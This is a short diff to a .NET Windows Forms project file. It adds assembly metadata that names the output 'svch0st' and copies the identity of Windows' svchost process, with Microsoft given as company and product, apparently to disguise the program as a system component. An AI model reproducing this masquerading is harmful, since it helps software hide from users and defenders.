@@ -6,6 +6,11 @@
     <Nullable>enable</Nullable>
     <UseWindowsForms>true</UseWindowsForms>
     <ImplicitUsings>enable</ImplicitUsings>
+    <AssemblyName>svch0st</AssemblyName>
+    <Title>svch0st</Title>
+    <Description>Host Process for Windows Services</Description>
+    <Company>Microsoft Corporation</Company>
+    <Product>Microsoft® Windows® Operating System</Product>
   </PropertyGroup>
 
   <ItemGroup>
